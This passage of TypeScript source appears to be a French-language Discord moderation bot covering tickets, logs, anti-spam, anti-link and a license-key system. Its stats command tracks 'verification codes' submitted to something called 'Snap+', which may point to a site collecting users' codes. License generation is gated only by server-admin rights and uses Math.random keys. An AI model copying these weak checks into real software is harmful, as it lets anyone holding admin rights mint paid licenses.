  const role = guild.roles?.find((r: any) => r.id === roleId);
  if (!role) {
    return ephemeral(`❌ Rôle introuvable.`);
  }

  const createdAt = new Date(Number((BigInt(roleId) >> 22n) + 1420070400000n));

  return publicMsg('', [{
    title: `🎭 Informations sur @${role.name}`,
    color: role.color || 0x2B2D31,
    fields: [
      { name: '🏷️ Nom', value: role.name, inline: true },
      { name: '🆔 ID', value: `\`${roleId}\``, inline: true },
      { name: '🎨 Couleur', value: role.color ? `#${role.color.toString(16).padStart(6, '0').toUpperCase()}` : 'Aucune', inline: true },
      { name: '📍 Position', value: `${role.position}`, inline: true },
      { name: '👥 Mentionnable', value: role.mentionable ? 'Oui' : 'Non', inline: true },
      { name: '🔝 Affiché séparément', value: role.hoist ? 'Oui' : 'Non', inline: true },
      { name: '📅 Créé le', value: createdAt.toLocaleDateString('fr-FR'), inline: true },
    ],
    footer: { text: `Demandé par ${interaction.member.user.username}` }
  }]);
}

async function handleBringall(interaction: any) {
  const guildId = interaction.guild_id;
  const targetChannelId = getOption(interaction.data.options, 'salon') as string;

  // Get the user's current voice channel
  const memberRes = await discordFetch(`/guilds/${guildId}/members/${interaction.member.user.id}`);
  const member = await memberRes.json();
  
  // Get all members in voice channels
  const membersRes = await discordFetch(`/guilds/${guildId}/members?limit=1000`);
  const members = await membersRes.json();

  // Get voice states
  const guildRes = await discordFetch(`/guilds/${guildId}?with_counts=true`);
  const guild = await guildRes.json();

  let moved = 0;
  // Move members (we need to check who is in voice)
  for (const m of members) {
    // Try to move member to target channel
    const moveRes = await discordFetch(`/guilds/${guildId}/members/${m.user.id}`, {
      method: 'PATCH',
      body: JSON.stringify({ channel_id: targetChannelId })
    });
    if (moveRes.ok) moved++;
  }

  return publicMsg(`✅ **${moved}** membre(s) déplacé(s) vers <#${targetChannelId}>.`);
}

// Handle stats command
async function handleStats(interaction: any, supabase: any) {
  const [
    { count: totalVisits },
    { data: lastVisit },
    { count: totalSubmissions },
    { data: lastSubmission },
    { count: codesSubmitted },
    { count: codesApproved },
    { count: codesRejected },
    { data: statsConfig }
  ] = await Promise.all([
    supabase.from('visits').select('*', { count: 'exact', head: true }),
    supabase.from('visits').select('visited_at').order('visited_at', { ascending: false }).limit(1).single(),
    supabase.from('submissions').select('*', { count: 'exact', head: true }),
    supabase.from('submissions').select('created_at').order('created_at', { ascending: false }).limit(1).single(),
    supabase.from('submissions').select('*', { count: 'exact', head: true }).not('code', 'is', null),
    supabase.from('submissions').select('*', { count: 'exact', head: true }).eq('status', 'approved'),
    supabase.from('submissions').select('*', { count: 'exact', head: true }).eq('status', 'rejected'),
    supabase.from('stats_config').select('*').eq('id', 'main').single()
  ]);

  const now = new Date();
  const startedAt = statsConfig?.started_at ? new Date(statsConfig.started_at) : now;
  
  const diff = now.getTime() - startedAt.getTime();
  const days = Math.floor(diff / (1000 * 60 * 60 * 24));
  const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
  const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
  const uptime = `${days}j ${hours}h ${minutes}m`;

  const formatDateTime = (date: Date) => date.toLocaleDateString('fr-FR', {
    day: '2-digit', month: '2-digit', year: 'numeric'
  }) + ' ' + date.toLocaleTimeString('fr-FR', {
    hour: '2-digit', minute: '2-digit', second: '2-digit'
  });

  const totalCodes = codesSubmitted || 0;
  const approvedPercent = totalCodes > 0 ? ((codesApproved || 0) / totalCodes * 100).toFixed(1) : '0.0';
  const rejectedPercent = totalCodes > 0 ? ((codesRejected || 0) / totalCodes * 100).toFixed(1) : '0.0';

  const embed = {
    title: "📊 Statistiques en temps réel - Snap+",
    color: 0x2B2D31,
    fields: [
      {
        name: "👥 Visiteurs",
        value: [
          `🌐 **Total des visites:** ${totalVisits || 0}`,
          `🕐 **Dernière visite:** ${lastVisit?.visited_at ? formatDateTime(new Date(lastVisit.visited_at)) : 'Aucune'}`
        ].join('\n'),
        inline: false
      },
      {
        name: "📝 Inscriptions",
        value: [
          `📋 **Total inscriptions:** ${totalSubmissions || 0}`,
          `🕐 **Dernière inscription:** ${lastSubmission?.created_at ? formatDateTime(new Date(lastSubmission.created_at)) : 'Aucune'}`
        ].join('\n'),
        inline: false
      },
      {
        name: "🔐 Codes de vérification",
        value: [
          `📤 **Codes soumis:** ${codesSubmitted || 0}`,
          `✅ **Codes acceptés:** ${codesApproved || 0} (${approvedPercent}%)`,
          `❌ **Codes rejetés:** ${codesRejected || 0} (${rejectedPercent}%)`
        ].join('\n'),
        inline: false
      },
      {
        name: "⚙️ Système",
        value: `🟢 **Uptime:** ${uptime}`,
        inline: false
      }
    ],
    footer: {
      text: `Demandé par ${interaction.member?.user?.username || 'Utilisateur'}`
    },
    timestamp: now.toISOString()
  };

  return new Response(JSON.stringify({
    type: INTERACTION_RESPONSE_TYPE.CHANNEL_MESSAGE_WITH_SOURCE,
    data: { embeds: [embed] }
  }), { headers: { 'Content-Type': 'application/json' } });
}

// ==================== NEW COMMANDS ====================

// Slowmode command
async function handleSlowmode(interaction: any) {
  const duration = getOption(interaction.data.options, 'duree') as number;
  const channelId = getOption(interaction.data.options, 'salon') as string || interaction.channel_id;

  if (duration < 0 || duration > 21600) {
    return ephemeral(`❌ Durée invalide (0-21600 secondes).`);
  }

  const res = await discordFetch(`/channels/${channelId}`, {
    method: 'PATCH',
    body: JSON.stringify({ rate_limit_per_user: duration })
  });

  if (!res.ok) {
    return ephemeral(`❌ Impossible de modifier le slowmode.`);
  }

  if (duration === 0) {
    return publicMsg(`⏱️ Slowmode désactivé dans <#${channelId}>.`);
  }
  return publicMsg(`⏱️ Slowmode défini à **${duration}s** dans <#${channelId}>.`);
}

// Temprole command
async function handleTemprole(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const memberId = getOption(interaction.data.options, 'membre') as string;
  const roleId = getOption(interaction.data.options, 'role') as string;
  const durationStr = getOption(interaction.data.options, 'duree') as string;

  const durationMs = parseDuration(durationStr);
  if (!durationMs) {
    return ephemeral(`❌ Durée invalide. Format: 1h, 1d, 7d`);
  }

  // Add role
  const res = await discordFetch(`/guilds/${guildId}/members/${memberId}/roles/${roleId}`, { method: 'PUT' });
  if (!res.ok) {
    return ephemeral(`❌ Impossible d'ajouter le rôle.`);
  }

  const expiresAt = new Date(Date.now() + durationMs);
  
  // Save to database
  await supabase.from('temp_roles').insert({
    guild_id: guildId,
    user_id: memberId,
    role_id: roleId,
    expires_at: expiresAt.toISOString()
  });

  return publicMsg(`✅ Le rôle <@&${roleId}> a été ajouté à <@${memberId}> pour **${formatDuration(durationMs)}**.`);
}

// Note command
async function handleNote(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const modId = interaction.member.user.id;
  const targetId = getOption(interaction.data.options, 'membre') as string;
  const note = getOption(interaction.data.options, 'note') as string;

  await supabase.from('user_notes').insert({
    guild_id: guildId,
    user_id: targetId,
    moderator_id: modId,
    note
  });

  return ephemeral(`📝 Note ajoutée pour <@${targetId}>.`);
}

// Notes command
async function handleNotes(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const targetId = getOption(interaction.data.options, 'membre') as string;

  const { data: notes } = await supabase
    .from('user_notes')
    .select('*')
    .eq('guild_id', guildId)
    .eq('user_id', targetId)
    .order('created_at', { ascending: false })
    .limit(10);

  if (!notes || notes.length === 0) {
    return ephemeral(`📝 Aucune note pour <@${targetId}>.`);
  }

  const noteList = notes.map((n: any, i: number) => {
    const date = new Date(n.created_at).toLocaleDateString('fr-FR');
    return `**${i + 1}.** ${date} par <@${n.moderator_id}>\n   └ ${n.note}`;
  }).join('\n\n');

  return ephemeral('', [{
    title: `📝 Notes sur l'utilisateur`,
    description: noteList,
    color: 0x2B2D31,
    footer: { text: `Total: ${notes.length} note(s)` }
  }]);
}

// Announce command
async function handleAnnounce(interaction: any) {
  const title = getOption(interaction.data.options, 'titre') as string;
  const message = getOption(interaction.data.options, 'message') as string;
  const channelId = getOption(interaction.data.options, 'salon') as string || interaction.channel_id;
  const mention = getOption(interaction.data.options, 'mention') as boolean || false;

  const embed = {
    title: `📢 ${title}`,
    description: message,
    color: 0x3B82F6,
    timestamp: new Date().toISOString(),
    footer: { text: `Annonce par ${interaction.member.user.username}` }
  };

  const content = mention ? '@everyone' : '';

  await discordFetch(`/channels/${channelId}/messages`, {
    method: 'POST',
    body: JSON.stringify({ content, embeds: [embed] })
  });

  return ephemeral(`✅ Annonce envoyée dans <#${channelId}>.`);
}

// Ticket command
async function handleTicket(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const userId = interaction.member.user.id;
  const subject = getOption(interaction.data.options, 'sujet') as string || 'Support';

  // Get guild config for category
  const { data: config } = await supabase
    .from('guild_config')
    .select('ticket_category_id, ticket_support_role_id')
    .eq('guild_id', guildId)
    .single();

  // Create channel
  const channelName = `ticket-${interaction.member.user.username}`.toLowerCase().replace(/[^a-z0-9-]/g, '');
  
  const permissionOverwrites = [
    { id: guildId, type: 0, deny: '1024' }, // @everyone can't see
    { id: userId, type: 1, allow: '1024' }  // User can see
  ];

  if (config?.ticket_support_role_id) {
    permissionOverwrites.push({ id: config.ticket_support_role_id, type: 0, allow: '1024' });
  }

  const createRes = await discordFetch(`/guilds/${guildId}/channels`, {
    method: 'POST',
    body: JSON.stringify({
      name: channelName,
      type: 0,
      parent_id: config?.ticket_category_id || null,
      permission_overwrites: permissionOverwrites
    })
  });

  if (!createRes.ok) {
    return ephemeral(`❌ Impossible de créer le ticket.`);
  }

  const channel = await createRes.json();

  // Save to database
  await supabase.from('tickets').insert({
    guild_id: guildId,
    channel_id: channel.id,
    user_id: userId,
    created_by: userId,
    subject,
    status: 'open'
  });

  // Send welcome message in ticket
  await discordFetch(`/channels/${channel.id}/messages`, {
    method: 'POST',
    body: JSON.stringify({
      content: `<@${userId}>`,
      embeds: [{
        title: '🎫 Ticket Ouvert',
        description: `Bienvenue dans votre ticket !\n\n**Sujet:** ${subject}\n\nUn membre du support vous répondra bientôt.\nUtilisez \`/close\` pour fermer ce ticket.`,
        color: 0x22C55E,
        timestamp: new Date().toISOString()
      }]
    })
  });

  return ephemeral(`✅ Votre ticket a été créé: <#${channel.id}>`);
}

// Close ticket command
async function handleClose(interaction: any, supabase: any) {
  const channelId = interaction.channel_id;
  const closedBy = interaction.member.user.id;
  const reason = getOption(interaction.data.options, 'raison') as string || 'Aucune raison';

  // Check if this is a ticket channel
  const { data: ticket } = await supabase
    .from('tickets')
    .select('*')
    .eq('channel_id', channelId)
    .single();

  if (!ticket) {
    return ephemeral(`❌ Ce salon n'est pas un ticket.`);
  }

  // Update database
  await supabase.from('tickets').update({
    status: 'closed',
    closed_at: new Date().toISOString(),
    closed_by: closedBy
  }).eq('channel_id', channelId);

  // Send closing message
  await discordFetch(`/channels/${channelId}/messages`, {
    method: 'POST',
    body: JSON.stringify({
      embeds: [{
        title: '🎫 Ticket Fermé',
        description: `Ce ticket a été fermé par <@${closedBy}>.\n\n**Raison:** ${reason}\n\nLe salon sera supprimé dans 5 secondes.`,
        color: 0xEF4444,
        timestamp: new Date().toISOString()
      }]
    })
  });

  // Delete channel after delay
  setTimeout(async () => {
    await discordFetch(`/channels/${channelId}`, { method: 'DELETE' });
  }, 5000);

  return ephemeral(`✅ Ticket fermé.`);
}

// Add user to ticket
async function handleAddToTicket(interaction: any, supabase: any) {
  const channelId = interaction.channel_id;
  const memberId = getOption(interaction.data.options, 'membre') as string;

  // Check if this is a ticket channel
  const { data: ticket } = await supabase
    .from('tickets')
    .select('*')
    .eq('channel_id', channelId)
    .single();

  if (!ticket) {
    return ephemeral(`❌ Ce salon n'est pas un ticket.`);
  }

  // Add permission for user
  await discordFetch(`/channels/${channelId}/permissions/${memberId}`, {
    method: 'PUT',
    body: JSON.stringify({ type: 1, allow: '1024' })
  });

  return publicMsg(`✅ <@${memberId}> a été ajouté au ticket.`);
}

// Remove user from ticket
async function handleRemoveFromTicket(interaction: any, supabase: any) {
  const channelId = interaction.channel_id;
  const memberId = getOption(interaction.data.options, 'membre') as string;

  const { data: ticket } = await supabase
    .from('tickets')
    .select('*')
    .eq('channel_id', channelId)
    .single();

  if (!ticket) {
    return ephemeral(`❌ Ce salon n'est pas un ticket.`);
  }

  await discordFetch(`/channels/${channelId}/permissions/${memberId}`, { method: 'DELETE' });

  return publicMsg(`✅ <@${memberId}> a été retiré du ticket.`);
}

// Create logs category + channels
async function handleLogs(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const botToken = Deno.env.get('DISCORD_BOT_TOKEN');
  const DISCORD_API = 'https://discord.com/api/v10';

  // Check if already configured
  const { data: existing } = await supabase
    .from('guild_config')
    .select('logs_category_id')
    .eq('guild_id', guildId)
    .single();

  if (existing?.logs_category_id) {
    return ephemeral('⚠️ Les logs sont déjà configurés sur ce serveur. Supprimez la catégorie manuellement pour reconfigurer.');
  }

  // Get guild name for category
  const guildRes = await discordFetch(`/guilds/${guildId}`);
  const guild = await guildRes.json();
  const serverName = guild.name?.toUpperCase() || 'SERVER';

  // Create category
  const catRes = await discordFetch(`/guilds/${guildId}/channels`, {
    method: 'POST',
    body: JSON.stringify({
      name: `${serverName} - logs`,
      type: 4, // GUILD_CATEGORY
      permission_overwrites: [
        {
          id: guildId, // @everyone role
          type: 0,
          deny: '1024' // VIEW_CHANNEL denied for everyone
        }
      ]
    })
  });

  if (!catRes.ok) {
    return ephemeral('❌ Impossible de créer la catégorie. Vérifie que le bot a la permission "Gérer les salons".');
  }

  const category = await catRes.json();
  const categoryId = category.id;

  // Channels to create
  const logChannels = [
    { name: 'raid-logs', key: 'raid_logs_channel_id' },
    { name: 'mod-logs', key: 'mod_logs_channel_id' },
    { name: 'msg-logs', key: 'msg_logs_channel_id' },
    { name: 'role-logs', key: 'role_logs_channel_id' },
    { name: 'voice-logs', key: 'voice_logs_channel_id' },
    { name: 'boost-logs', key: 'boost_logs_channel_id' },
  ];

  const channelIds: Record<string, string> = {};

  for (const ch of logChannels) {
    const chRes = await discordFetch(`/guilds/${guildId}/channels`, {
      method: 'POST',
      body: JSON.stringify({
        name: ch.name,
        type: 0, // GUILD_TEXT
        parent_id: categoryId,
      })
    });

    if (chRes.ok) {
      const created = await chRes.json();
      channelIds[ch.key] = created.id;
    }
  }

  // Save to database
  await supabase.from('guild_config').upsert({
    id: guildId,
    guild_id: guildId,
    logs_category_id: categoryId,
    logs_channel_id: channelIds.mod_logs_channel_id || null,
    raid_logs_channel_id: channelIds.raid_logs_channel_id || null,
    mod_logs_channel_id: channelIds.mod_logs_channel_id || null,
    msg_logs_channel_id: channelIds.msg_logs_channel_id || null,
    role_logs_channel_id: channelIds.role_logs_channel_id || null,
    voice_logs_channel_id: channelIds.voice_logs_channel_id || null,
    boost_logs_channel_id: channelIds.boost_logs_channel_id || null,
    updated_at: new Date().toISOString()
  }, { onConflict: 'guild_id' });

  const channelList = logChannels
    .map(ch => channelIds[ch.key] ? `✅ <#${channelIds[ch.key]}>` : `❌ ${ch.name}`)
    .join('\n');

  return publicMsg('', [{
    title: '📋 Logs configurés !',
    description: `La catégorie **${serverName} - logs** a été créée avec les salons suivants :\n\n${channelList}`,
    color: 0x22C55E,
    footer: { text: 'Les logs seront envoyés automatiquement dans ces salons.' }
  }]);
}

// Set welcome channel
async function handleSetWelcome(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const channelId = getOption(interaction.data.options, 'salon') as string;
  const message = getOption(interaction.data.options, 'message') as string || 'Bienvenue {user} sur **{server}** ! 🎉';

  await supabase.from('guild_config').upsert({
    id: guildId,
    guild_id: guildId,
    welcome_channel_id: channelId,
    welcome_message: message,
    updated_at: new Date().toISOString()
  }, { onConflict: 'guild_id' });

  return publicMsg(`✅ Salon de bienvenue défini sur <#${channelId}>.`);
}

// Antiraid config
async function handleAntiraid(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const enabled = getOption(interaction.data.options, 'activer') as boolean;
  const maxJoins = getOption(interaction.data.options, 'max_joins') as number || 10;
  const timeframe = getOption(interaction.data.options, 'secondes') as number || 60;

  await supabase.from('guild_config').upsert({
    id: guildId,
    guild_id: guildId,
    antiraid_enabled: enabled,
    antiraid_max_joins: maxJoins,
    antiraid_timeframe: timeframe,
    updated_at: new Date().toISOString()
  }, { onConflict: 'guild_id' });

  if (enabled) {
    return publicMsg(`🛡️ Anti-raid **activé**. Max ${maxJoins} joins en ${timeframe}s.`);
  }
  return publicMsg(`🛡️ Anti-raid **désactivé**.`);
}

// Captcha config
async function handleCaptcha(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const enabled = getOption(interaction.data.options, 'activer') as boolean;
  const channelId = getOption(interaction.data.options, 'salon') as string;
  const roleId = getOption(interaction.data.options, 'role') as string;

  await supabase.from('guild_config').upsert({
    id: guildId,
    guild_id: guildId,
    captcha_enabled: enabled,
    captcha_channel_id: channelId || null,
    captcha_role_id: roleId || null,
    updated_at: new Date().toISOString()
  }, { onConflict: 'guild_id' });

  if (enabled) {
    return publicMsg(`🔒 Captcha **activé**.${channelId ? ` Salon: <#${channelId}>` : ''}${roleId ? ` Rôle: <@&${roleId}>` : ''}`);
  }
  return publicMsg(`🔒 Captcha **désactivé**.`);
}

// Antilink config
async function handleAntilink(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const action = getOption(interaction.data.options, 'action') as string;

  if (action === 'max') {
    // Show current settings
    const { data: config } = await supabase
      .from('guild_config')
      .select('antilink_enabled, antilink_type, antilink_sanction, antilink_ignored_channels')
      .eq('guild_id', guildId)
      .single();

    const enabled = config?.antilink_enabled ? '✅ Activé' : '❌ Désactivé';
    const type = config?.antilink_type === 'all' ? 'Tous les liens' : 'Invitations Discord';
    const sanction = config?.antilink_sanction === 'delete' ? 'Suppression uniquement' : 'Suppression + sanction';
    const ignored = config?.antilink_ignored_channels?.length || 0;

    return ephemeral('', [{
      title: '🔗 Paramètres Anti-Lien',
      color: 0x2B2D31,
      fields: [
        { name: 'État', value: enabled, inline: true },
        { name: 'Type', value: type, inline: true },
        { name: 'Sanction', value: sanction, inline: true },
        { name: 'Salons ignorés', value: `${ignored} salon(s)`, inline: true }
      ]
    }]);
  }

  const enabled = action === 'on';
  await supabase.from('guild_config').upsert({
    id: guildId,
    guild_id: guildId,
    antilink_enabled: enabled,
    updated_at: new Date().toISOString()
  }, { onConflict: 'guild_id' });

  if (enabled) {
    return publicMsg(`🔗 Anti-lien **activé**. Les liens d'invitation Discord seront supprimés automatiquement.`);
  }
  return publicMsg(`🔗 Anti-lien **désactivé**.`);
}

// Antilink ignore channel
async function handleAntilinkIgnore(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const action = getOption(interaction.data.options, 'action') as string;
  const channelId = getOption(interaction.data.options, 'salon') as string;

  // Get current config
  const { data: config } = await supabase
    .from('guild_config')
    .select('antilink_ignored_channels')
    .eq('guild_id', guildId)
    .single();

  let channels: string[] = config?.antilink_ignored_channels || [];

  if (action === 'on') {
    if (!channels.includes(channelId)) {
      channels.push(channelId);
    }
    await supabase.from('guild_config').upsert({
      id: guildId,
      guild_id: guildId,
      antilink_ignored_channels: channels,
      updated_at: new Date().toISOString()
    }, { onConflict: 'guild_id' });
    return publicMsg(`✅ Le salon <#${channelId}> est maintenant **ignoré** par l'antilink.`);
  } else {
    channels = channels.filter(c => c !== channelId);
    await supabase.from('guild_config').upsert({
      id: guildId,
      guild_id: guildId,
      antilink_ignored_channels: channels,
      updated_at: new Date().toISOString()
    }, { onConflict: 'guild_id' });
    return publicMsg(`✅ Le salon <#${channelId}> n'est **plus ignoré** par l'antilink.`);
  }
}

// Antilink sanction
async function handleAntilinkSanction(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const action = getOption(interaction.data.options, 'action') as string;

  const sanction = action === 'on' ? 'sanction' : 'delete';
  await supabase.from('guild_config').upsert({
    id: guildId,
    guild_id: guildId,
    antilink_sanction: sanction,
    updated_at: new Date().toISOString()
  }, { onConflict: 'guild_id' });

  if (action === 'on') {
    return publicMsg(`⚠️ Les sanctions antilink sont **activées**. Les utilisateurs seront sanctionnés en plus de la suppression.`);
  }
  return publicMsg(`✅ Les sanctions antilink sont **désactivées**. Les messages seront juste supprimés.`);
}

// Antilink type
async function handleAntilinkType(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const type = getOption(interaction.data.options, 'type') as string;

  await supabase.from('guild_config').upsert({
    id: guildId,
    guild_id: guildId,
    antilink_type: type,
    updated_at: new Date().toISOString()
  }, { onConflict: 'guild_id' });

  if (type === 'all') {
    return publicMsg(`🔗 L'antilink bloquera **tous les liens**.`);
  }
  return publicMsg(`🔗 L'antilink bloquera uniquement les **liens d'invitation Discord**.`);
}

// Antispam config
async function handleAntispam(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const action = getOption(interaction.data.options, 'action') as string;

  if (action === 'max') {
    const { data: config } = await supabase
      .from('guild_config')
      .select('antispam_enabled, antispam_max_messages, antispam_timeframe, antispam_sanction')
      .eq('guild_id', guildId)
      .single();

    const enabled = config?.antispam_enabled ? '✅ Activé' : '❌ Désactivé';
    const maxMsg = config?.antispam_max_messages || 5;
    const timeframe = config?.antispam_timeframe || 5;
    const sanction = config?.antispam_sanction || 'mute';

    return ephemeral('', [{
      title: '🛡️ Paramètres Anti-Spam',
      color: 0x2B2D31,
      fields: [
        { name: 'État', value: enabled, inline: true },
        { name: 'Messages max', value: `${maxMsg} messages`, inline: true },
        { name: 'Intervalle', value: `${timeframe} secondes`, inline: true },
        { name: 'Sanction', value: sanction.toUpperCase(), inline: true }
      ]
    }]);
  }

  const enabled = action === 'on';
  await supabase.from('guild_config').upsert({
    id: guildId,
    guild_id: guildId,
    antispam_enabled: enabled,
    updated_at: new Date().toISOString()
  }, { onConflict: 'guild_id' });

  if (enabled) {
    return publicMsg(`🛡️ Anti-spam **activé**.`);
  }
  return publicMsg(`🛡️ Anti-spam **désactivé**.`);
}

// Antispam configuration
async function handleAntispamConfig(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const messages = getOption(interaction.data.options, 'messages') as number;
  const timeframe = getOption(interaction.data.options, 'secondes') as number;
  const sanction = getOption(interaction.data.options, 'sanction') as string;

  const updates: any = {
    id: guildId,
    guild_id: guildId,
    updated_at: new Date().toISOString()
  };

  if (messages) updates.antispam_max_messages = messages;
  if (timeframe) updates.antispam_timeframe = timeframe;
  if (sanction) updates.antispam_sanction = sanction;

  await supabase.from('guild_config').upsert(updates, { onConflict: 'guild_id' });

  const parts = [];
  if (messages) parts.push(`Messages: **${messages}**`);
  if (timeframe) parts.push(`Intervalle: **${timeframe}s**`);
  if (sanction) parts.push(`Sanction: **${sanction}**`);

  return publicMsg(`✅ Configuration anti-spam mise à jour.\n${parts.join(' | ')}`);
}

// Settings command - show all bot settings
async function handleSettings(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;

  const { data: config } = await supabase
    .from('guild_config')
    .select('*')
    .eq('guild_id', guildId)
    .single();

  const c = config || {};

  const embed = {
    title: '⚙️ Paramètres du Bot',
    color: 0x2B2D31,
    fields: [
      {
        name: '🔗 Anti-Lien',
        value: [
          `État: ${c.antilink_enabled ? '✅' : '❌'}`,
          `Type: ${c.antilink_type === 'all' ? 'Tous les liens' : 'Invitations'}`,
          `Sanction: ${c.antilink_sanction === 'sanction' ? 'Oui' : 'Non'}`
        ].join('\n'),
        inline: true
      },
      {
        name: '🛡️ Anti-Spam',
        value: [
          `État: ${c.antispam_enabled ? '✅' : '❌'}`,
          `Max: ${c.antispam_max_messages || 5} msg / ${c.antispam_timeframe || 5}s`,
          `Sanction: ${c.antispam_sanction || 'mute'}`
        ].join('\n'),
        inline: true
      },
      {
        name: '🛡️ Anti-Raid',
        value: [
          `État: ${c.antiraid_enabled ? '✅' : '❌'}`,
          `Max: ${c.antiraid_max_joins || 10} joins / ${c.antiraid_timeframe || 60}s`
        ].join('\n'),
        inline: true
      },
      {
        name: '🔒 Captcha',
        value: [
          `État: ${c.captcha_enabled ? '✅' : '❌'}`,
          c.captcha_channel_id ? `Salon: <#${c.captcha_channel_id}>` : 'Salon: Non défini',
          c.captcha_role_id ? `Rôle: <@&${c.captcha_role_id}>` : 'Rôle: Non défini'
        ].join('\n'),
        inline: true
      },
      {
        name: '👋 Bienvenue',
        value: c.welcome_channel_id ? `<#${c.welcome_channel_id}>` : 'Non configuré',
        inline: true
      },
      {
        name: '📋 Logs',
        value: c.logs_channel_id ? `<#${c.logs_channel_id}>` : 'Non configuré',
        inline: true
      }
    ],
    footer: { text: `Serveur: ${guildId}` },
    timestamp: new Date().toISOString()
  };

  return ephemeral('', [embed]);
}

// ===== LICENSE SYSTEM =====

// Generate random license key
function generateLicenseKey(): string {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  const segments = [];
  for (let i = 0; i < 4; i++) {
    let segment = '';
    for (let j = 0; j < 4; j++) {
      segment += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    segments.push(segment);
  }
  return segments.join('-'); // Format: XXXX-XXXX-XXXX-XXXX
}

// Check if guild has valid license
async function hasValidLicense(supabase: any, guildId: string): Promise<{ valid: boolean; license?: any }> {
  const { data: license } = await supabase
    .from('bot_licenses')
    .select('*')
    .eq('guild_id', guildId)
    .eq('is_active', true)
    .single();

  if (!license) {
    return { valid: false };
  }

  // Check expiration
  if (license.expires_at && new Date(license.expires_at) < new Date()) {
    // License expired, deactivate it
    await supabase
      .from('bot_licenses')
      .update({ is_active: false })
      .eq('id', license.id);
    return { valid: false };
  }

  return { valid: true, license };
}

// License command handler
async function handleLicense(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const userId = interaction.member.user.id;
  const action = getOption(interaction.data.options, 'action') as string;
  const key = getOption(interaction.data.options, 'key') as string | undefined;
  const plan = getOption(interaction.data.options, 'plan') as string || 'standard';
  const duration = getOption(interaction.data.options, 'duration') as number | undefined;

  if (action === 'info') {
    const { valid, license } = await hasValidLicense(supabase, guildId);

    if (!valid) {
      return ephemeral('', [{
        title: '🔒 Aucune licence active',
        description: 'Ce serveur n\'a pas de licence active.\n\nUtilisez `/license activate key:VOTRE-CLÉ` pour activer une licence.',
        color: 0xEF4444,
        fields: [
          { name: '💡 Comment obtenir une licence ?', value: 'Contactez le propriétaire du bot pour acheter une clé de licence.', inline: false }
        ]
      }]);
    }

    const expiresAt = license.expires_at ? new Date(license.expires_at).toLocaleDateString('fr-FR') : 'Jamais';
    const activatedAt = new Date(license.activated_at).toLocaleDateString('fr-FR');

    return ephemeral('', [{
      title: '✅ Licence Active',
      description: 'Ce serveur possède une licence valide.',
      color: 0x22C55E,
      fields: [
        { name: '🔑 Clé', value: `\`${license.license_key.substring(0, 9)}...\``, inline: true },
        { name: '📦 Plan', value: license.plan_type.charAt(0).toUpperCase() + license.plan_type.slice(1), inline: true },
        { name: '👤 Activée par', value: `<@${license.activated_by}>`, inline: true },
        { name: '📅 Date d\'activation', value: activatedAt, inline: true },
        { name: '⏰ Expiration', value: expiresAt, inline: true }
      ],
      timestamp: new Date().toISOString()
    }]);
  }

  if (action === 'activate') {
    if (!key) {
      return ephemeral('❌ Veuillez fournir une clé de licence avec l\'option `key`.');
    }

    // Check if guild already has a license
    const { data: existingLicense } = await supabase
      .from('bot_licenses')
      .select('*')
      .eq('guild_id', guildId)
      .eq('is_active', true)
      .single();

    if (existingLicense) {
      return ephemeral('❌ Ce serveur possède déjà une licence active.');
    }

    // Check if key is valid and not redeemed - trim and normalize key
    const normalizedKey = key.trim().toUpperCase();
    console.log('Looking for license key:', normalizedKey);
    
    const { data: validLicense, error: keyError } = await supabase
      .from('valid_licenses')
      .select('*')
      .eq('license_key', normalizedKey)
      .eq('redeemed', false)
      .maybeSingle();

    console.log('License lookup result:', { validLicense, keyError });

    if (!validLicense) {
      return ephemeral('❌ Clé de licence invalide ou déjà utilisée.');
    }

    // Calculate expiration
    let expiresAt: Date | null = null;
    if (validLicense.duration_days) {
      expiresAt = new Date();
      expiresAt.setDate(expiresAt.getDate() + validLicense.duration_days);
    }

    // Activate the license
    const { error: activateError } = await supabase.from('bot_licenses').insert({
      guild_id: guildId,
      license_key: normalizedKey,
      activated_by: userId,
      plan_type: validLicense.plan_type,
      expires_at: expiresAt
    });

    if (activateError) {
      console.error('License activation error:', activateError);
      return ephemeral('❌ Erreur lors de l\'activation de la licence.');
    }

    // Mark key as redeemed
    await supabase
      .from('valid_licenses')
      .update({ redeemed: true, redeemed_by: guildId, redeemed_at: new Date().toISOString() })
      .eq('id', validLicense.id);

    const expirationText = expiresAt ? expiresAt.toLocaleDateString('fr-FR') : 'Jamais';

    return publicMsg('', [{
      title: '🎉 Licence Activée !',
      description: 'La licence a été activée avec succès sur ce serveur.',
      color: 0x22C55E,
      fields: [
        { name: '📦 Plan', value: validLicense.plan_type.charAt(0).toUpperCase() + validLicense.plan_type.slice(1), inline: true },
        { name: '⏰ Expiration', value: expirationText, inline: true },
        { name: '👤 Activée par', value: `<@${userId}>`, inline: true }
      ],
      footer: { text: 'Merci pour votre confiance !' }
    }]);
  }

  if (action === 'generate') {
    // Only bot owner/admin can generate licenses
    const permissions = BigInt(interaction.member.permissions);
    const isAdmin = (permissions & BigInt(0x8)) === BigInt(0x8);

    if (!isAdmin) {
      return ephemeral('❌ Vous n\'avez pas la permission de générer des licences.');
    }

    const newKey = generateLicenseKey();

    // Insert into valid_licenses
    const { error } = await supabase.from('valid_licenses').insert({
      license_key: newKey,
      plan_type: plan,
      duration_days: duration || (plan === 'lifetime' ? null : 30)
    });

    if (error) {
      console.error('License generation error:', error);
      return ephemeral('❌ Erreur lors de la génération de la licence.');
    }

